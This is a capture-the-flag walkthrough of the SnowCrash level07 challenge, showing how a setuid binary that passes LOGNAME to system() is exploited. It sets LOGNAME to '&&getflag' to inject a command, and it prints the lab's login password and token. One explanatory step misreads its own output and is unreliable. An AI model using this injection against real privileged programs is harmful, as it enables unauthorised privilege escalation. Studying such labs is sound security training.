## Level07

Login as usual wih a password

```
ssh -i ~/.ssh/id_rsa.pub level07@127.0.0.1 -p 4242
wiok45aaoguiboiki2tuin6ub
```

We saw a level07 file as below

```
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

So,let's dig in to this file, Overall, the output indicates that level07 is a 32-bit ELF(Executable and Linkable Format)executable file with setuid and setgid permissions, dynamically linked, and intended to run on GNU/Linux systems.
The presence of the text "ELF" in the output confirms that it is indeed a binary file.

<details>
  <summary> Binary file </summary>
  A binary file is a type of computer file that stores data in a format that is not human-readable. Unlike text files, which store data as a sequence of characters encoded using a character encoding scheme (such as ASCII or Unicode), binary files store data in a format that is directly understandable by a computer's hardware and software.
  </details>

```
level07@SnowCrash:~$ file level07
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
```

I executed this file, and nothing came out.

```
level07@SnowCrash:~$ ./level07
level07
```

So, let's use **ltrace** command to understand/to debug the behavior of this program

```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                      = 2007
geteuid()                                                                      = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                            = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                            = 0
getenv("LOGNAME")                                                              = "level07"
asprintf(0xbffff704, 0x8048688, 0xbfffff3c, 0xb7e5ee55, 0xb7fed280)            = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                         = 0
+++ exited (status 0) +++
```

From this output, it appears that the level07 program sets its group and user IDs, retrieves the username "level07", constructs a command string using that username, and then executes the command to print the username "level07".

So, I can see the **getenv("LOGNAME") = "level07"**

Given this spec, let's check the logname
(This tells the shell to substitute the value of the variable LOGNAME into the command before executing. As we saw before precedant exercise, need to put $ to get the value - traits of shell)

```
level07@SnowCrash:~$ echo $LOGNAME
level07
```

I did small tests as below.

```
level07@SnowCrash:~$ export LOGNAME="HELLO_WORLD";
level07@SnowCrash:~$ ./level07
HELLO_WORLD
```

1. `export LOGNAME="HELLO_WORLD"`: This command sets the value of the environment variable `LOGNAME` to "HELLO_WORLD". The `export` keyword makes this variable available to all subsequently executed programs within the current shell session.

2. `./level07`: This command executes the `level07` program in the current directory.

Therefore, when you run `./level07`, the `level07` program is executed with the value of the `LOGNAME` environment variable set to "HELLO_WORLD". As a result, the program prints "HELLO_WORLD" because that is the value of the `LOGNAME` variable that it uses during execution.

With the same logic, I use the command **export &getflag** and I got the very interesting informations.

```
level07@SnowCrash:~$ export &getflag
[1] 15957
declare -x HOME="/home/user/level07"
declare -x LANG="en_US.UTF-8"
declare -x LC_TERMINAL="iTerm2"
declare -x LC_TERMINAL_VERSION="3.4.22"
declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
declare -x LESSOPEN="| /usr/bin/lesspipe %s"
declare -x LOGNAME="&&getflag"
declare -x LS_COLORS="rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
declare -x MAIL="/var/mail/level07"
declare -x OLDPWD="/home/user/level07"
declare -x PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
declare -x PWD="/home/user/level07"
declare -x SHELL="/bin/bash"
declare -x SHLVL="1"
declare -x SSH_CLIENT="10.0.2.2 54751 4242"
declare -x SSH_CONNECTION="10.0.2.2 54751 10.0.2.15 4242"
declare -x SSH_TTY="/dev/pts/0"
declare -x TERM="xterm-256color"
declare -x USER="level07"
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
[1]+  Done                    export
```

Take a look at **declare -x LOGNAME="&&getflag"**.

The command `declare -x LOGNAME="&&getflag"` is used to create or modify an environment variable named `LOGNAME` and set its value to `"&&getflag"`.

Here's a breakdown of each part of the command:

- `declare`: This is a bash built-in command used to declare variables and give them attributes. In this case, it's used to declare an environment variable.

- `-x`: This option is used to export the variable to the environment. It makes the variable available to all subsequently executed programs within the current shell session.

- `LOGNAME`: This is the name of the environment variable being declared.

- `"&&getflag"`: This is the value assigned to the `LOGNAME` variable. In this case, it's the string `"&&getflag"`. The `&&` operator is a logical AND operator in bash, and `getflag` appears to be a command. So, the value of `LOGNAME` is set to the string `"&&getflag"`, which includes the `&&` operator followed by the command `getflag`.

So, based on this info, let's assign the value `LOGNAME="&&getflag"`with export command.

When you run the command `export LOGNAME="&&getflag"`, you are setting the value of the `LOGNAME` environment variable to `"&&getflag"` and exporting it. This means that `LOGNAME` will be available to all subsequently executed programs within the current shell session. And we got the token after execution of the file of ./level07

```
level07@SnowCrash:~$ export LOGNAME="&&getflag"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

<details>
  <summary> Password </summary>
  fiumuikeil55xe9cu4dood66h
  </details>
